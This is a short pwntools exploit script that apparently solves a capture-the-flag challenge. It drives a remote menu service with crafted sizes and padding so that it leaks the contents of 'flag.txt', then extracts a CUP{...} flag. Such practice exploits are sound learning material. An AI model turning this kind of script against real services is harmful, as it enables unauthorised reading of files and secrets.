#!/usr/bin/env python3

from pwn import *
import sys
import re

# SETTINGS

r = remote(sys.argv[1], int(sys.argv[2]))

# SPLOIT #
r.recvuntil("> ")
r.sendline(b"1")
r.recvuntil(": ")
r.sendline(b"flag.txt")
r.recvuntil("> ")
r.sendline(b"2")
r.recvuntil(": ")
r.sendline(b"128")
r.recvuntil("> ")
r.sendline(b"3")
r.recvuntil("> ")
r.sendline(b"4")
r.recvuntil(": ")
r.sendline(b"Y")
r.recvuntil(": ")
r.sendline(b"8192")
r.recvuntil(": ")
r.sendline(b"a" * 32)
r.recv()
data = r.recv()
print("[+] Flag:", re.findall(b"CUP\{[a-z0-9]{32}\}", data)[0].decode())
r.close()